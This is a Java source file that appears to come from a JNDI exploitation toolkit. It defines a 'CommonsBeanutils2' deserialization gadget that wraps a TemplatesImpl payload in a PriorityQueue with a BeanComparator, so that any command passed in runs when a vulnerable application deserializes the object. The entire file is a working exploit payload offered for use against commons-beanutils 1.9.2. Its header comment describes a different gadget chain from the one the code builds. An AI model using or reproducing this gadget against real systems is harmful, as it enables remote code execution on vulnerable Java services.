package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;



/**
 * 	Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			PriorityQueue.readObject()
 * 				...
 * 					TransformingComparator.compare()
 * 						InvokerTransformer.transform()
 * 							Method.invoke()
 * 								Runtime.exec()
 */

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.CCKUAILONG })
public class CommonsBeanutils2 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

        return queue;
    }
}
